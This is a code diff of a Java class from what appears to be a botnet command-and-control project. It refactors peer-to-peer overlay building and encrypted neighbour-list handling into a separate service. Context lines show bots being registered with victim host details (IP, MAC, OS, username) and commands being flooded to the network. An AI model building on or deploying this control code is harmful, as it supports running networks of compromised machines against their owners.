@@ -37,6 +37,7 @@ import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.network.request.CecRequest;
 import cs.sii.service.connection.NetworkService;
+import cs.sii.service.connection.P2PMan;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.crypto.CryptoUtils;
 import cs.sii.service.dao.BotServiceImpl;
@@ -66,11 +67,9 @@ public class Commando {
 
 	@Autowired
 	private NetworkService nServ;
-
 	@Autowired
-	private UserServiceImpl userService;
+	private P2PMan pServ;
 
-	private UndirectedGraph<IP, DefaultEdge> graph;
 
 	@Autowired
 	private CryptoPKI pki;
@@ -92,80 +91,16 @@ public class Commando {
 	 */
 	public void initializeCeC() {
 		nServ.updateDnsInformation();
-		graph = createNetworkP2P();
 		//TODO impostare vicinato cc
-		System.out.println("blab " + graph);
 		newKing = nServ.getMyIp().toString();
-
+		pServ.initP2P();
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
 		bServ.save(bot);
 	}
 
-	/**
-	 * @param nodes
-	 * @return
-	 */
-	private Integer calculateK(Integer nodes) {
-		Integer k= (int) Math.ceil(Math.log10(nodes + 1));
-		if (nodes>3){
-			k++;
-		}
-		return k;
-	}
-
-	/**
-	 * @return
-	 */
-	@SuppressWarnings("unchecked")
-	public UndirectedGraph<IP, DefaultEdge> createNetworkP2P() {
-		// creo grafo partenza
-		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
-		List<Bot> bots = bServ.findAll();
-
-		ArrayList<IP> nodes = new ArrayList<IP>();
-		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
-
-		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
-				new SecureRandom(), true, false);
-		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
-		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
-		for (IP ip2 : nodes) {
-			System.out.println("gli archi di  " + graph.degreeOf(ip2));
-		}
-		System.out.println("graph" + graph);
-		System.out.println("gdegree " + calculateK(nodes.size()));
-		return graph;
-	}
-
-	/**
-	 * @return
-	 */
-	@SuppressWarnings("unchecked")
-	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P() {
-
-		List<Bot> bots = bServ.findAll();
-		ArrayList<IP> nodes = new ArrayList<IP>();
-
-		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
-
-		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
-				new SecureRandom(), true, false);
-		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
-				DefaultEdge.class);
-		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
-		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
-		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
-		for (IP ip2 : nodes) {
-			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
-		}
-		System.out.println("graph" + graph2);
-		System.out.println("gdegree " + calculateK(nodes.size()));
-		this.graph = graph2;
-		return graph;
-	}
-
+	
 	/**
 	 * @param idBot
 	 * @return
@@ -215,66 +150,8 @@ public class Commando {
 	 * @throws NoSuchAlgorithmException
 	 * @throws InvalidKeyException
 	 */
-	public byte[] getNeighbours(String data)
-			throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException,
-			InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
-		String idBot;
-		Bot bot = null;
-		try {
-			idBot = pki.getCrypto().decryptAES(data);
-		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
-				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException
-				| UnsupportedEncodingException e) {
-			System.out.println("failed to decrypt data");
-			return null;
-		}
-		System.out.println("id bot " + idBot);
-		bot = bServ.searchBotId(idBot);
-
-		if (bot == null) {
-			return null;// non autenticato
-		} else {
-			System.out.println(" bot " + bot.getIp());
-			if (graph.containsVertex(new IP(bot.getIp()))) {
-				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
-				if (neighbours.size() < calculateK(bServ.findAll().size())) {
-					updateNetworkP2P();
-				}
-			} else {
-				updateNetworkP2P();
-			}
-		}
-
-		Set<DefaultEdge> setEd = graph.edgesOf(new IP(bot.getIp()));
-		DefaultEdge[] a = new DefaultEdge[setEd.size()];
-		setEd.toArray(a);
-
-		ArrayList<Object> ipN = new ArrayList<Object>();
-		for (int i = 0; i < a.length; i++) {
-
-			IP s = graph.getEdgeSource(a[i]);
-			IP t = graph.getEdgeTarget(a[i]);
-			if (!s.equals(new IP(bot.getIp()))) {
-				Bot sB = bServ.searchBotIP(s);
-				ipN.add(new Pairs<String, String>(sB.getIp(),(sB.getPubKey())));
-			}
-			if (!t.equals(new IP(bot.getIp()))) {
-				Bot tB = bServ.searchBotIP(t);
-				ipN.add(new Pairs<String, String>(tB.getIp(), tB.getPubKey()));
-			}
-
-		}	ByteArrayOutputStream ostream = new ByteArrayOutputStream();
-		try {
-			pki.getCrypto().encrypt(ipN, ostream);
-			ByteArrayInputStream kk = new ByteArrayInputStream(ostream.toByteArray());
-			
-			if(ipN.equals(pki.getCrypto().decrypt(kk)))System.out.println("ggg0");
-			
-		} catch (IOException e) {
-				System.out.println("fail encrypt neighbours");
-		}
-
-		return ostream.toByteArray();
+	public byte[] getNeighbours(String data){
+		return pServ.getNeighbours(data);
 	}
 
 	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
@@ -290,7 +167,7 @@ public class Commando {
 	@Async
 	public void flooding(String cmd, String userSSoID) {
 
-		User user = userService.getUserRepository().findBySsoId(userSSoID);
+		User user = uServ.getUserRepository().findBySsoId(userSSoID);
 		if (user != null) {
 
 			String msg = "";
@@ -387,11 +264,7 @@ public class Commando {
 	}
 
 	public UndirectedGraph<IP, DefaultEdge> getGraph() {
-		return graph;
-	}
-
-	public void setGraph(UndirectedGraph<IP, DefaultEdge> graph) {
-		this.graph = graph;
+		return pServ.getGraph();
 	}
 
 	public BotRequest getbReq() {
